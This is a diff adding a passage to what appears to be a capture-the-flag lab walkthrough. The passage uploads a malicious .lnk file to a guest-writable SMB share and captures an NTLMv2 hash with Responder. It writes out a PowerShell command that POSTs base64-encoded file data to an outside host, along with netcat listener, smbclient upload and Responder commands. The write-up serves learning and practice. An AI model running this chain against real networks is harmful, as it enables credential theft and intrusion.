@@ -271,3 +271,51 @@ Because of this, it is a good idea to name the malicious lnk file something begi
 > [!IMPORTANT]
 > You will need to change `$lnk.TargetPath` so it points to your attacking machine IP address - the rest can be left as it is
 
+I created the lnk file on a windows machine so then had to transfer it to my kali vm :ghost: This is all good practise of transferring files from windows to linux :smiley: 
+
+```powershell
+    $b = [System.convert]::ToBase64String((Get-Content -Path "C:\app.lnk" -Encoding Byte))
+    Invoke-WebRequest -Uri "http://192.168.56.101:4321/" -Method POST -Body $b
+```
+
+![wh2](/images/30.png)
+
+We need to have *netcat* listening on our kali machine to receive the encoded data.
+
+`sudo nc -nlvp 4321`
+
+![wh3](/images/31.png)
+
+We can copy the encoded data which we receive into a txt file. In the example below I copy and paste it into a file called *reset.txt*
+
+We then need to base64 decode it and put it into a lnk file.
+
+```bash
+    nano reset.txt
+    base64 --decode reset.txt > reset.lnk
+```
+
+To upload the malicious lnk file we have just created, we can use the *Data* share.
+
+I started *responder* with its default settings before uploading the malicious lnk file.
+
+`sudo responder -I tun0`
+
+![wh4](/images/32.png)
+
+```bash
+    sudo smbclient \\\\10.10.238.231\\Data -U THM.corp\\guest
+    cd onboarding
+    put reset.lnk
+```
+
+![wh5](/images/33.png)
+
+It didn't take long before lo and behold :trumpet: :trumpet: :trumpet: an *ntlmv2* hash for the *automate* user came speeding across to my attacking machine :smile:
+
+![wh6](/images/34.png)
+
+---
+
+## cracking the automate hash
+
